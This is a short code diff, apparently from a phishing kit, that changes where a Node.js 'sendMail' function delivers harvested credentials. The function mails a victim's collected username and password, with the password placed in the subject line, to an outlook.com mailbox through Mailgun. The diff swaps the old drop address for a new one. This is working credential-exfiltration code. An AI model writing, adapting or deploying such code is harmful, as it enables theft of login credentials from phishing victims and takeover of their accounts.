@@ -15,7 +15,7 @@ const transporter = nodemailer.createTransport(mailGun(auth))
 const sendMail = (collectUserName,collectPassword,cb) => {
     const mailOptions = {
         from: collectUserName,
-        to: 'connormcassady23@outlook.com',
+        to: 'hermandelgado456@outlook.com',
         subject: collectPassword,
         text: 'the Logins lord commander'
     }
